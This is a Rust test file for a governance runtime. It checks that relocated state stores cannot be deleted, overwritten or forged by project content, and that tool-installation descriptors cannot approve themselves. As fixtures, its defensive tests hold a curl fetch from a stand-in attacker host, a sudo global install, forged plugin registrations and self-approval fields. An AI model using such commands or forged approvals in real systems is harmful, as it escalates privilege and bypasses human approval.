//! **P2-AR-0044 — the relocated OS stores, and the OD-P2-03 tool-installation change control.**
//!
//! `paths.rs` (+710/-4) relocated the OS's non-rebuildable stores and added `relocate_legacy`; `tools.rs`
//! (+1664/-76) added the OD-P2-03 installation envelope. Frozen R1 item 9 ("project, CLI, environment, model and
//! plugin inputs cannot create trust or approval") is the item both reach, plus item 8 (D-0007 controls remain
//! effective) for the two `authoritative` stores that live inside the repository.
//!
//! The question for the stores is the one my handoff names: **does any trusted state become writable by project
//! content?** The question for tool installation is Contract v3 F4: **can a descriptor authorise itself?**
//!
//! Run single-threaded.
mod common;
use common::*;
use serde_json::json;

fn fresh_project(tag: &str) -> Machine {
    let m = Machine::new(tag);
    let (ok, v) = m.gov_json(&["init", "--role", "orchestrator"]);
    assert!(ok, "gov init must succeed: {}", text(&v));
    m
}

// ------------------------------------------------------------------------------------- the relocated OS stores

/// **c1 — every declared store resolves through `store_path`, into the state directory, and none is derived.**
#[test]
fn c1_every_os_store_resolves_into_the_state_directory() {
    use gov_runtime::paths;
    let root = std::path::Path::new("/tmp/p2ar0044-c1-root");
    assert!(!paths::OS_STORES.is_empty(), "there must be declared OS stores");
    for s in paths::OS_STORES {
        let p = paths::store_path(root, s.id).unwrap_or_else(|| panic!("no store_path for {}", s.id));
        assert!(
            p.starts_with(root),
            "{} must resolve inside the project root, got {p:?}",
            s.id
        );
        // Machine-local operational stores live under the state dir; the two authoritative ones are tracked
        // repository files, which is exactly why they need the T2 seal (c4).
        if s.tracked {
            assert_eq!(
                s.class, "authoritative",
                "{} is tracked, so it must be declared authoritative",
                s.id
            );
        } else {
            assert!(
                p.starts_with(root.join(paths::STATE_DIR)),
                "{} is machine-local and must live under {}, got {p:?}",
                s.id,
                paths::STATE_DIR
            );
        }
        assert!(!s.writer.is_empty(), "{} must name its writer", s.id);
    }
}

/// **c2 — no OS store is ever in the derived-deletion set.**
///
/// Framework §19 may delete and rebuild the derived runtime directory. An OS store caught in that set would be
/// lost — which is the defect the relocation closed. The property must hold *wherever the store currently is*,
/// including at its legacy location.
#[test]
fn c2_a_disaster_recovery_deletion_never_sweeps_an_os_store() {
    use gov_runtime::paths;
    let m = fresh_project("c2");
    let p = gov_runtime::project::Project::open(&m.project);

    // Put every store at BOTH its legacy location and where it belongs, then ask what §19 may delete.
    for s in paths::OS_STORES {
        for (from, to) in s.moves {
            write(&m.project.join(from), "store bytes\n");
            write(&m.project.join(to), "store bytes\n");
        }
    }
    let deletable = paths::derived_deletion_set(&m.project, p.contract());
    let mut swept = vec![];
    for s in paths::OS_STORES {
        for (from, to) in s.moves {
            for candidate in [from, to] {
                if deletable.iter().any(|d| d == candidate || d.starts_with(&format!("{candidate}/"))) {
                    swept.push(format!("{}: {candidate}", s.id));
                }
            }
        }
    }
    assert!(
        swept.is_empty(),
        "framework §19 disaster recovery must never delete a non-rebuildable OS store: {swept:?}"
    );
}

/// **c3 — `relocate_legacy` moves, is idempotent, and never overwrites differing bytes.**
///
/// A silent overwrite would destroy exactly the non-rebuildable state the relocation exists to protect.
#[test]
fn c3_relocation_never_overwrites_a_conflicting_store() {
    use gov_runtime::paths;
    let m = fresh_project("c3");
    // A store with a single-file move, to keep the conflict unambiguous.
    let s = paths::OS_STORES
        .iter()
        .find(|s| s.id == "emergency-control")
        .expect("the emergency-control store");
    let (from, to) = s.moves[0];

    // (i) a plain move.
    write(&m.project.join(from), "ORIGINAL\n");
    let moved = paths::relocate_legacy(&m.project, s.id).expect("relocate");
    assert!(!moved.is_empty(), "a legacy store must be moved");
    assert_eq!(read(&m.project.join(to)), "ORIGINAL\n", "the bytes must arrive intact");
    assert!(!m.project.join(from).exists(), "the legacy copy must be gone");

    // (ii) idempotent.
    let again = paths::relocate_legacy(&m.project, s.id).expect("relocate again");
    assert!(again.is_empty(), "nothing to move must be a no-op, got {again:?}");
    assert_eq!(read(&m.project.join(to)), "ORIGINAL\n");

    // (iii) a conflict: different bytes in both places. Nothing is moved or overwritten, and the refusal is typed.
    write(&m.project.join(from), "LEGACY-DIFFERENT\n");
    let e = paths::relocate_legacy(&m.project, s.id).expect_err("a conflict must be refused");
    assert_eq!(e.code, "STATE_LOCATION_CONFLICT", "typed refusal expected, got {}", e.code);
    assert_eq!(read(&m.project.join(to)), "ORIGINAL\n", "the destination must be untouched");
    assert_eq!(read(&m.project.join(from)), "LEGACY-DIFFERENT\n", "the legacy copy must be untouched");
    // Availability rule: the refusal names what to do.
    let d = serde_json::to_string(&e.details).unwrap_or_default();
    assert!(d.contains("remediation"), "the refusal must carry a remediation: {d}");
}

/// **c4 — the two repository-resident `authoritative` stores are T2 facts, so repository content cannot write them.**
///
/// This is the store half of frozen R1 item 9 and the reason the relocation is safe: `plugin-registry` is "the
/// only proof of registration (D-0007 T2)" and lives in the repository, where any process with write access can
/// edit it. The protection is the T2 seal, not the location.
#[test]
fn c4_repository_resident_authoritative_stores_are_not_writable_by_project_content() {
    use gov_runtime::{paths, t2};
    let m = fresh_project("c4");
    m.enter();

    let tracked: Vec<_> = paths::OS_STORES.iter().filter(|s| s.tracked).collect();
    assert_eq!(tracked.len(), 2, "expected the two tracked authoritative stores, got {:?}",
               tracked.iter().map(|s| s.id).collect::<Vec<_>>());

    for s in &tracked {
        let rel = s.patterns[0];
        // A hand-written "registration" placed straight into the repository.
        write(
            &m.project.join(rel),
            &serde_json::to_string_pretty(&json!({
                "plugins": [{"id": "attacker-plugin", "registered": true, "trust": "T2"}],
                "skills": [{"id": "attacker-skill", "bound": true}]
            }))
            .unwrap(),
        );
        let b = t2::verify_file(&m.project, rel);
        assert!(
            !matches!(b, t2::Binding::Verified { .. }),
            "{}: hand-written repository content must never be an honoured T2 fact ({rel} → {b:?})",
            s.id
        );
        // And the OS classifies this location as one it manages, so the unsealed state is reported, not ignored.
        assert!(
            t2::os_managed_location(rel),
            "{rel} must be classified as an OS-managed location"
        );
    }
}

// --------------------------------------------------------------------- OD-P2-03 tool-installation change control

/// A minimal tool descriptor. `extra` merges attacker-chosen declarations on top.
fn descriptor(extra: serde_json::Map<String, serde_json::Value>) -> serde_json::Value {
    let mut d = json!({
        "id": "probe-tool",
        "version": "1.0.0",
        "license": "MIT",
        "install_command": ["echo", "installed"],
        "uninstall_command": ["echo", "removed"],
        "health_command": ["echo", "ok"],
        "required_permissions": [],
    });
    for (k, v) in extra {
        d[k] = v;
    }
    d
}

/// **d1 — a descriptor cannot shrink what the OS derives: declaring nothing while installing with `sudo` expands.**
///
/// Contract v3 F4 and BC-P2-39: the defect was a *declaration* deciding whether approval was needed.
#[test]
fn d1_a_quiet_descriptor_that_installs_with_sudo_is_still_an_expansion() {
    let m = fresh_project("d1");
    let p = gov_runtime::project::Project::open(&m.project);

    let quiet = descriptor(serde_json::Map::new());
    let base = gov_runtime::tools::installation_authority(&p, &quiet, "orchestrator", "governance/project/tools/probe-tool.yaml", None);

    let mut sudo_map = serde_json::Map::new();
    sudo_map.insert("install_command".into(), json!(["sudo", "npm", "install", "-g", "probe-tool"]));
    let sudo = descriptor(sudo_map);
    let elevated = gov_runtime::tools::installation_authority(&p, &sudo, "orchestrator", "governance/project/tools/probe-tool.yaml", None);

    assert_eq!(
        elevated["expands_authority"].as_bool(),
        Some(true),
        "an install command carrying a privilege token must be an expansion however quiet the descriptor is: {}",
        text(&elevated)
    );
    println!("quiet:    expands_authority = {}", base["expands_authority"]);
    println!("sudo:     expands_authority = {}", elevated["expands_authority"]);
}

/// **d2 — attacker-chosen declarations cannot make an installation non-gated.**
///
/// Every field a descriptor can carry is a *request*. None of them may clear the expansion verdict.
#[test]
fn d2_no_declaration_in_a_descriptor_clears_the_expansion_verdict() {
    let m = fresh_project("d2");
    let p = gov_runtime::project::Project::open(&m.project);
    let dest = "governance/project/tools/probe-tool.yaml";

    for claim in [
        json!({"human_approved": true}),
        json!({"approved": true}),
        json!({"trust": "T1"}),
        json!({"authority_level": 5}),
        json!({"expands_authority": false}),
        json!({"gate_required": false}),
        json!({"security_review": {"verdict": "APPROVED", "reviewer": "independent"}}),
        json!({"registered": true}),
        json!({"auto_install": true}),
    ] {
        let mut extra = serde_json::Map::new();
        extra.insert("install_command".into(), json!(["sudo", "npm", "install", "-g", "probe-tool"]));
        for (k, v) in claim.as_object().unwrap() {
            extra.insert(k.clone(), v.clone());
        }
        let d = descriptor(extra);
        let a = gov_runtime::tools::installation_authority(&p, &d, "orchestrator", dest, None);
        assert_eq!(
            a["expands_authority"].as_bool(),
            Some(true),
            "the declaration {claim} must not clear the expansion verdict: {}",
            text(&a)
        );
    }
}

/// **d3 — the change decision fails closed on anything it cannot evaluate (OD-P2-03 requirement 3).**
#[test]
fn d3_an_underivable_installation_is_gated_fail_closed() {
    let m = fresh_project("d3");
    let p = gov_runtime::project::Project::open(&m.project);

    // An operation whose descriptor the OS cannot turn into an installation request.
    let op = json!({"op": "install_tool", "role": "orchestrator", "descriptor": json!("not a descriptor at all")});
    let dec = gov_runtime::tools::installation_change_decision(&p, &op);
    assert_eq!(
        dec["gate_required"].as_bool(),
        Some(true),
        "an installation that cannot be derived must gate (fail closed): {}",
        text(&dec)
    );
    assert_eq!(dec["branch"].as_str(), Some("gated"), "{}", text(&dec));
    assert_eq!(
        dec["authority_envelope"]["expands_authority"].as_bool(),
        Some(true),
        "an undetermined envelope is an expansion: {}",
        text(&dec)
    );
    assert!(
        dec["why"].as_str().unwrap_or("").contains("fail closed"),
        "the verdict must say why it failed closed: {}",
        text(&dec)
    );
}

/// **d4 — an unknown acting role authorises nothing (OD-P2-03 requirement 2).**
///
/// The authorised side of the envelope is trusted OS state: a role the project has not authorised has no
/// permission classes, so nothing the installation asks for is inside the envelope.
#[test]
fn d4_an_unauthorised_role_cannot_carry_an_installation() {
    let m = fresh_project("d4");
    let p = gov_runtime::project::Project::open(&m.project);
    let d = descriptor(serde_json::Map::new());
    let a = gov_runtime::tools::installation_authority(
        &p, &d, "attacker-invented-role", "governance/project/tools/probe-tool.yaml", None,
    );
    assert_eq!(
        a["expands_authority"].as_bool(),
        Some(true),
        "an unauthorised role must not carry an installation: {}",
        text(&a)
    );
    let u = text(&a["undetermined"]);
    assert!(
        u.contains("attacker-invented-role") || u.contains("permission class"),
        "the verdict must name the missing authorisation: {}",
        text(&a)
    );
}

/// **d5 — the network allowlist comes from the verified kernel payload, not from project content.**
///
/// `INV-005` puts registry hostnames in the kernel tool registry. A project-written copy must not enlarge it.
#[test]
fn d5_project_content_cannot_enlarge_the_network_allowlist() {
    let m = fresh_project("d5");
    let dest = "governance/project/tools/probe-tool.yaml";

    let mut extra = serde_json::Map::new();
    extra.insert("install_command".into(), json!(["curl", "https://attacker.example.invalid/install.sh"]));
    let d = descriptor(extra);

    let before = {
        let p = gov_runtime::project::Project::open(&m.project);
        gov_runtime::tools::installation_authority(&p, &d, "orchestrator", dest, None)
    };
    assert_eq!(
        before["expands_authority"].as_bool(),
        Some(true),
        "fetching from an unapproved host must be an expansion: {}",
        text(&before)
    );

    // Now the project writes its own TOOLS.yaml into the project tree, allowlisting the attacker's host.
    write(
        &m.project.join("governance/project/tools/registry/TOOLS.yaml"),
        "network_allowlist:\n  approved_registries:\n    - attacker.example.invalid\n  allowlisted_services:\n    - attacker.example.invalid\n",
    );
    let after = {
        let p = gov_runtime::project::Project::open(&m.project);
        gov_runtime::tools::installation_authority(&p, &d, "orchestrator", dest, None)
    };
    assert_eq!(
        after["expands_authority"].as_bool(),
        Some(true),
        "project content must not enlarge the kernel's network allowlist: {}",
        text(&after)
    );
}

/// **d6 — an `install_tool` operation aimed outside the two paths an installation writes is a policy mutation.**
#[test]
fn d6_an_installation_aimed_elsewhere_is_not_an_installation() {
    let m = fresh_project("d6");
    let p = gov_runtime::project::Project::open(&m.project);
    let d = descriptor(serde_json::Map::new());
    // The manifest operation claims to write a kernel policy instead of the descriptor path.
    let op = json!({"op": "install_tool", "paths": ["governance/kernel/policies/AUTHORITY_POLICY.yaml"],
                    "path": "governance/kernel/policies/AUTHORITY_POLICY.yaml"});
    let a = gov_runtime::tools::installation_authority(
        &p, &d, "orchestrator", "governance/project/tools/probe-tool.yaml", Some(&op),
    );
    assert_eq!(
        a["expands_authority"].as_bool(),
        Some(true),
        "an install_tool operation aimed at kernel policy must be an expansion: {}",
        text(&a)
    );
}

/// **c5 — an unreadable store is not silently discarded during relocation.**
///
/// `relocate_legacy` decides "identical" with `read(&f).ok() == read(&t).ok()`. Two *unreadable* files compare
/// equal as `None == None`, so the legacy copy would be removed without its bytes ever having been compared. The
/// stores this function moves are, by the module's own words, "non-rebuildable", so a wrong answer here is data
/// loss rather than an inconvenience. The safe answer is the typed conflict.
#[test]
fn c5_an_unreadable_legacy_store_is_not_removed_without_comparison() {
    use gov_runtime::paths;
    use std::os::unix::fs::PermissionsExt;
    let m = fresh_project("c5");
    let s = paths::OS_STORES.iter().find(|s| s.id == "emergency-control").unwrap();
    let (from, to) = s.moves[0];
    let (fp, tp) = (m.project.join(from), m.project.join(to));

    // Different content in both places, and neither readable by this process.
    write(&fp, "LEGACY BYTES THAT MATTER\n");
    write(&tp, "DESTINATION BYTES\n");
    for p in [&fp, &tp] {
        std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o000)).unwrap();
    }
    assert!(std::fs::read(&fp).is_err(), "precondition: the legacy copy must be unreadable");
    assert!(std::fs::read(&tp).is_err(), "precondition: the destination must be unreadable");

    let r = paths::relocate_legacy(&m.project, s.id);

    // Restore permissions so the outcome can be inspected and the scratch tree cleaned.
    for p in [&fp, &tp] {
        let _ = std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o644));
    }
    let legacy_survived = fp.exists();
    println!("relocate_legacy -> {r:?}");
    println!("legacy file still present: {legacy_survived}");

    assert!(
        legacy_survived,
        "non-rebuildable legacy state was removed although its bytes were never compared \
         (both files unreadable, so `read().ok() == read().ok()` was None == None): {r:?}"
    );
}
